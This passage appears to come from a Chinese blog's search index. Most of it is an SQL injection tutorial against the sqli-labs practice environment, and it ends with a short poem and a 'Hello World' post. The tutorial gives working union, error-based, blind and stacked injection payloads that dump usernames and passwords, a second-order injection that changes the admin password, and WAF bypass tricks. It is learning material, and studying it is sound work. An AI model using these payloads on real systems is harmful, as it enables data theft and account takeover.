1=2 页面运行错误，则说明此 Sql 注入为数字型注入。</p></blockquote><ul><li>字符型判断：<br>可以使用 and ‘1’=’1 和 and ‘1’=’2来判断：</li></ul><blockquote><p>url中输入1’ and ‘1’ = ‘1,页面运行正常，继续进行下一步。<br>url中继续输入1’ and ‘1’ = ‘2,页面运行错误，则说明此 Sql 注入为字符型注入。</p></blockquote><h2 id="常见的注入方式"><a href="#常见的注入方式" class="headerlink" title="常见的注入方式"></a>常见的注入方式</h2><blockquote><p>联合注入</p><p>布尔盲注</p><p>时间盲注</p><p>宽字节注入</p><p>报错注入</p><p>堆叠注入</p><p>二次注入</p><p>……</p></blockquote><h2 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h2><p>注入一般流程：</p><blockquote><ol><li>判断注入点</li><li>判断字段数</li><li>判断回显位置</li><li>爆破库名</li><li>爆破表名</li><li>爆破字段名</li><li>爆破字段值</li></ol></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">以<span class="keyword">sql</span><span class="operator">-</span>libs<span class="operator">/</span>Less<span class="number">-1</span>为例</span><br><span class="line">(<span class="number">1</span>)判断注入点</span><br><span class="line">payload：http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>www.sql.com<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=1 --+</span></span><br><span class="line"><span class="string">payload： http://localhost/www.sql.com/Less-1/?id=1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="comment">--+</span></span><br><span class="line">根据页面回显不同，判断id参数存在<span class="keyword">sql</span>注入</span><br><span class="line">(<span class="number">2</span>)判断字段数 <span class="keyword">order</span> <span class="keyword">by</span></span><br><span class="line">payload：http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>www.sql.com<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by x --+</span></span><br><span class="line"><span class="string">发现x=3时有回显，x=4时无回显，判断出存在三列</span></span><br><span class="line"><span class="string">(3)判断回显位置 union select需将参数的数据值设为不存在</span></span><br><span class="line"><span class="string">payload：http://localhost/sqli-labs/Less-1/?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="comment">--+ </span></span><br><span class="line">判断出回显位置为<span class="number">2</span>，<span class="number">3</span></span><br><span class="line">(<span class="number">4</span>)爆破库名 在回显位置替换参数即可</span><br><span class="line">payload：http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,database(),3 --+ </span></span><br><span class="line"><span class="string">(5)爆破表名 </span></span><br><span class="line"><span class="string">payload：http://localhost/sqli-labs/Less-1/?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()),<span class="number">3</span> <span class="comment">--+ </span></span><br><span class="line">(<span class="number">6</span>)爆破字段名</span><br><span class="line">payload：http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;),3 --+ </span></span><br><span class="line"><span class="string">(7)爆破字段值</span></span><br><span class="line"><span class="string">payload：http://localhost/sqli-labs/Less-1/?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(username,<span class="number">0x3a</span>,password) <span class="keyword">from</span> users),<span class="number">3</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>应用场景：查询不回显内容，会打印错误信息</p><blockquote><p>常用函数：floor(),updatexml(),extractvalue()</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">以updatexml()为例</span><br><span class="line">(<span class="number">1</span>)爆表 修改 limit <span class="number">0</span>,<span class="number">1</span> 参数 依次爆出所有表名</span><br><span class="line">payload：http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+</span></span><br><span class="line"><span class="string">(2)爆字段名</span></span><br><span class="line"><span class="string">payload：http://localhost/sqli-labs/Less-1/?id=1&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="comment">--+</span></span><br><span class="line">通过修改limit参数，获取所有字段名</span><br><span class="line">(<span class="number">3</span>)爆字段值</span><br><span class="line">payload：http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1) --+</span></span><br><span class="line"><span class="string">通过修改limit参数，获取所有字段值</span></span><br><span class="line"><span class="string">(4)爆对应的密码</span></span><br><span class="line"><span class="string">payload：http://localhost/sqli-labs/Less-1/?id=1&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> password <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;Dumb&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="comment">--+</span></span><br><span class="line">通过修改limit参数，获取所有字段值</span><br></pre></td></tr></table></figure><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>应用场景：</p><blockquote><p>代码存在sql注入漏洞，然而页面不会显数据，也不会显错误信息。只返回”right” 与wrong 这里我们可以通过构造语句，来判断数据库信息的正确性，在通过页面的“真”和“假”来识别我们的判断是否正确，这就是布尔盲注。</p></blockquote><p>常用函数：</p><blockquote><p>left()       left(database(),1)&gt;’s’    database()显示数据库名称，left(a,b)从左侧截取a的前b位。<br>regexp           select user() regexp ‘^r’  正则表达式用法 user()结果为root,regexp为匹配root的正则表达式<br>like         select users() like ‘’ro%’   与regexp类似，使用like进行匹配<br>substr函数   ascii() 函数    ascii(substr(select database()),1,1)=98 从1位置开始截取数据库名字的1个长度，ascii()将字符转化为ascii值。<br>ord()   mid()     mid(a,b,c)<br>ord(mid((select user()),1,1))=114<br>从位置b开始，截取a字符串的c位，ord()函数通ascii()，将字符转为ascii值。</p></blockquote><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>时间盲注是什么？</p><blockquote><p>通过注入特定语句，根据对页面请求的物理反馈，来判断是否注入成功，如：在SQL语句中使用sleep()函数</p><p>看加载页面的时间来判断注入点</p><p>适用场景：没有回显，甚至连注入语句是否执行都无从得知</p></blockquote><p>常用函数：</p><blockquote><p>sleep() – 返回0 命令中断返回1<br>substr(a,b,c) – 从b为止开始截取字符串a的c长度<br>mid() – 与substr完全一致<br>count() – 计算总数<br>ascii() – 返回第一个字符的ASII码<br>ord() – 与ascii完全一致<br>length() – 返回字符串的长度<br>left() – 从左往右截取字符串<br>right() –从右往左截取字符串<br>if(condition,true,false)：condition为条件，条件为真返回true，条件为假返回false</p></blockquote><p>注入一般流程：</p><blockquote><p>先用length()获取数据库长度<br>用substr() and sleep() 来确定每一个字符，从而确定数据库</p></blockquote><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><blockquote><p>原理介绍： 在SQL中，分号（;）是用来表示一条sql语句的结束。</p></blockquote><blockquote><p>联合注入也是将两条语句合并在一起，两者之间有什么区别么？<br>区别就在于union或者unionall执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。 </p></blockquote><blockquote><p>局限性： 使用该注入，需要知道数据库的一些信息，例如表名，列名等。<br>并不是每种环境都可以使用。<br>oracle数据库不行，mysql、mssql‘postgresql可以。  </p></blockquote><blockquote><p>应用实例：已经爆破出管理员密码，但是是加密存储，且无法解密。可以使用堆叠注入，在该表中注入 </p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">举个栗子</span><br><span class="line">;<span class="keyword">select</span> if(length(database())<span class="operator">&gt;</span><span class="number">1</span>,sleep(<span class="number">3</span>),<span class="number">1</span>)</span><br><span class="line">;<span class="keyword">select</span> if(substr(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;r&#x27;</span>,sleep(<span class="number">3</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><blockquote><p>原理 分为两步：<br>第一步：插入恶意数据<br>第一次进行数据库插入数据的时候，仅仅对其中的特殊字符进行转义，在写入数据库时还是保留用户输入的数据，但是该数据中包含恶意内容。 </p><p>第二步：引用恶意数据<br>在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次需要进行查询的时候，直接从数据库中取出了恶意数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。 </p></blockquote><blockquote><p>例如：<br>输入参数1’     参数经过转义函数变为1&#39;    参数进入数据库存储还原为1’<br>寻找另一处引用这个数据的操作<br>将1’从数据库中取出       取出后直接给变量并且带入SQL   SQL注入触发 实战   sql-lib 24 1.在创建用户界面 创建 admin’#  123 账号 2.登录  admin ‘#  123 账号 修改admin’#密码为  123456 3.发现 admin 密码变为123456</p></blockquote><blockquote><p>实战   sql-lib 24<br>1.在创建用户界面 创建 admin’#  123 账号<br>2.登录  admin ‘#  123 账号 修改admin’#密码为  123456<br>3.发现 admin 密码变为123456</p></blockquote><h2 id="SQL注入绕过"><a href="#SQL注入绕过" class="headerlink" title="SQL注入绕过"></a>SQL注入绕过</h2><ul><li>注入符号绕过<br>常见的注释符号有</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 注释内容</span></span><br><span class="line"># 注释内容</span><br><span class="line"><span class="comment">/*注释内容*/</span></span><br><span class="line">;</span><br></pre></td></tr></table></figure><ul><li>大小写绕过</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">举个例子</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure><ul><li>内联注释绕过</li><li>内联注释就是把一些特有的仅在MYSQL上的语句放在 <code>/*!...*/</code> 中，这样这些语句如果在其它数据库中是不会被执行，但在MYSQL中会执行。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">举个例子</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">-1</span> <span class="keyword">union</span> <span class="comment">/*!select*/</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>;</span><br></pre></td></tr></table></figure><ul><li><p>双写关键字绕过<br>将关键字<code>select</code>等只使用<code>replace()</code>函数置换为空，这时候可以使用双写关键字绕过。例如<code>select</code>变成<code>seleselectct</code>，在经过<code>waf</code>的处理之后又变成<code>select</code>，达到绕过的要求。</p></li><li><p>十六进制绕过</p></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">举个例子</span><br><span class="line">test1等价于<span class="number">0x7465737431</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="operator">=</span> <span class="number">0x7465737431</span>;</span><br></pre></td></tr></table></figure><ul><li>空格过滤绕过</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**/</span></span><br><span class="line">()</span><br><span class="line">回车(url编码中的<span class="operator">%</span><span class="number">0</span>a)</span><br><span class="line">`(tap键上面的按钮)</span><br><span class="line">tap</span><br><span class="line">两个空格</span><br></pre></td></tr></table></figure><ul><li>过滤or and xor not 绕过</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="operator">=</span> <span class="operator">&amp;&amp;</span></span><br><span class="line"><span class="keyword">or</span> <span class="operator">=</span> <span class="operator">||</span></span><br><span class="line">xor <span class="operator">=</span> <span class="operator">|</span> # 异或</span><br><span class="line"><span class="keyword">not</span> <span class="operator">=</span> <span class="operator">!</span></span><br></pre></td></tr></table></figure><ul><li>过滤等号=绕过<br>不加通配符的like执行的效果和=一致，所以可以用来绕过。<br>利用大小于号、!配合使用进行绕过</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无题</title>
      <link href="/post/9b44950b.html"/>
      <url>/post/9b44950b.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><blockquote><p>你路过我的春光明媚</p><p>离开我的望穿秋水</p><p>当雾气锁住凝眉</p><p>当笛声告别夕炊</p><p>最好你舍得我送别的眼</p><p>从此一去不回</p><p>最好我忘掉你流水的心</p><p>再无浊酒一杯</p><p>当我赶起羊群踏尽青草</p><p>当你忘了路过此地朝朝暮暮</p><p>天晓得柔情似水</p><p>妄想谁泪眼愁眉</p><p>等到所有的故事都死去</p><p>我爱过的人都成灰</p><p>有的变成河水</p><p>有的变成眼泪</p><p>该请谁来聆听</p><p>荒野的风声吹向月亮</p><p>我心如荒野    凛风不歇</p><p>该请谁来触及</p><p>青山的恻隐藏了四季</p><p>我身如青山    瘦贫瘠该</p><p>请谁来抵达</p><p>镜中青花结成了白发</p><p>我灵魂如镜    虚罄年华</p><p>该请谁来行歌</p><p>长河两侧的落落景色</p><p>我生如长河    终生奔波</p><p>终生    一无所获</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 我同桌的文集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World！</title>
      <link href="/post/24608.html"/>
      <url>/post/24608.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>去没人的岛，摸鲨鱼的角。</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
